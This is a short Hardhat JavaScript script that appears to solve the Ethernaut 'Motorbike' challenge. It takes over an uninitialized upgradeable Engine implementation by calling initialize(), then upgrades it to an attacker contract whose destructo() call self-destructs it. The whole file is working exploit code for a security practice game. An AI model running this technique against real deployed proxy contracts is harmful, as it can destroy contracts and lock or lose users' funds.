const { ethers, waffle } = require("hardhat");
const Deployer = require("./deployer");
const Runner = require("./lib/runner");

const provider = waffle.provider;

Runner.run(async () => {
    
    //PLACE MOTORBIKE CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0x3356FE5E1b76aB8b7D9Cf61079463C13496130E9";     
    
    //deploy attack contract 
    const attacker = await Deployer.deploy();
    
    console.log();
    console.log("* * * ");
    
    //get engine address from storage slot 
    let engineAddr = await provider.getStorageAt(contractAddr, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"); 
    engineAddr = "0x" + engineAddr.substr(26); 
    console.log(`engine address is ${engineAddr}`);
    
    //retrieve engine contract 
    const engine = await ethers.getContractAt("Engine", engineAddr); 
    console.log(`engine upgrader: ${await engine.upgrader()}`); 
    
    //become the engine upgrader by calling initialize()
    console.log('calling initialize...');
    await engine.initialize();
    console.log(`new engine upgrader: ${await engine.upgrader()}`); 
    
    //'upgrade' to attack engine 
    let funcSig = new ethers.utils.Interface(["function destructo()"]).encodeFunctionData("destructo", []);    
    console.log('upgrading');
    await engine.upgradeToAndCall(attacker.address, funcSig);
    
    console.log();
    console.log(`if you make any further calls to ${engineAddr}, they should be reverted, as the contract has been destroyed`);
    console.log("* * * ");
});